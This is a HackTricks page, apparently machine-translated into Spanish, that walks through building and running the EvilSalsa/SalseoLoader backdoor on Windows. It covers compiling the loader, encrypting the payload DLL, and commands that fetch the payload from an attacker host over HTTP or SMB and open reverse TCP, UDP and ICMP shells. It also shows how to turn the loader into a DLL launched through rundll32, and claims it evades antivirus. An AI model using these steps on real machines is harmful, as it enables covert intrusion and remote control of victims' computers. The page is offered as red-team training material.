# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compiling the binaries

Descarga el código fuente desde github y compila **EvilSalsa** y **SalseoLoader**. Necesitarás tener **Visual Studio** instalado para compilar el código.

Compila esos proyectos para la arquitectura de la caja de Windows donde los vas a usar (Si Windows soporta x64, compílalos para esa arquitectura).

Puedes **seleccionar la arquitectura** dentro de Visual Studio en la **pestaña "Build" izquierda** en **"Platform Target".**

(\*\*Si no puedes encontrar estas opciones, presiona en **"Project Tab"** y luego en **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Luego, construye ambos proyectos (Build -> Build Solution) (Dentro de los registros aparecerá la ruta del ejecutable):

![](<../.gitbook/assets/image (381).png>)

## Prepare the Backdoor

Primero que nada, necesitarás codificar el **EvilSalsa.dll.** Para hacerlo, puedes usar el script de python **encrypterassembly.py** o puedes compilar el proyecto **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, ahora tienes todo lo que necesitas para ejecutar todo el asunto de Salseo: el **EvilDalsa.dll codificado** y el **binario de SalseoLoader.**

**Sube el binario SalseoLoader.exe a la máquina. No deberían ser detectados por ningún AV...**

## **Ejecutar el backdoor**

### **Obteniendo un shell reverso TCP (descargando dll codificada a través de HTTP)**

Recuerda iniciar un nc como el listener del shell reverso y un servidor HTTP para servir el evilsalsa codificado.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obteniendo un shell reverso UDP (descargando dll codificada a través de SMB)**

Recuerda iniciar un nc como el oyente del shell reverso y un servidor SMB para servir el evilsalsa codificado (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obteniendo un shell reverso ICMP (dll codificada ya dentro de la víctima)**

**Esta vez necesitas una herramienta especial en el cliente para recibir el shell reverso. Descarga:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Desactivar las respuestas ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Ejecutar el cliente:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Dentro de la víctima, ejecutemos la cosa de salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilando SalseoLoader como DLL exportando la función principal

Abre el proyecto SalseoLoader usando Visual Studio.

### Agrega antes de la función principal: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Instalar DllExport para este proyecto

#### **Herramientas** --> **Administrador de paquetes NuGet** --> **Administrar paquetes NuGet para la solución...**

![](<../.gitbook/assets/image (881).png>)

#### **Buscar el paquete DllExport (usando la pestaña Buscar) y presionar Instalar (y aceptar el popup)**

![](<../.gitbook/assets/image (100).png>)

En tu carpeta de proyecto han aparecido los archivos: **DllExport.bat** y **DllExport\_Configure.bat**

### **Des**instalar DllExport

Presiona **Desinstalar** (sí, es raro pero confía en mí, es necesario)

![](<../.gitbook/assets/image (97).png>)

### **Salir de Visual Studio y ejecutar DllExport\_configure**

Simplemente **sal** de Visual Studio

Luego, ve a tu **carpeta SalseoLoader** y **ejecuta DllExport\_Configure.bat**

Selecciona **x64** (si vas a usarlo dentro de una caja x64, ese fue mi caso), selecciona **System.Runtime.InteropServices** (dentro de **Namespace for DllExport**) y presiona **Aplicar**

![](<../.gitbook/assets/image (882).png>)

### **Abre el proyecto nuevamente con Visual Studio**

**\[DllExport]** no debería estar marcado como error

![](<../.gitbook/assets/image (670).png>)

### Compilar la solución

Selecciona **Tipo de salida = Biblioteca de clases** (Proyecto --> Propiedades de SalseoLoader --> Aplicación --> Tipo de salida = Biblioteca de clases)

![](<../.gitbook/assets/image (847).png>)

Selecciona **plataforma x64** (Proyecto --> Propiedades de SalseoLoader --> Compilación --> Objetivo de plataforma = x64)

![](<../.gitbook/assets/image (285).png>)

Para **compilar** la solución: Compilar --> Compilar solución (Dentro de la consola de salida aparecerá la ruta de la nueva DLL)

### Probar la Dll generada

Copia y pega la Dll donde quieras probarla.

Ejecuta:
```
rundll32.exe SalseoLoader.dll,main
```
Si no aparece ningún error, ¡probablemente tengas un DLL funcional!

## Obtén un shell usando el DLL

No olvides usar un **servidor** **HTTP** y configurar un **listener** **nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
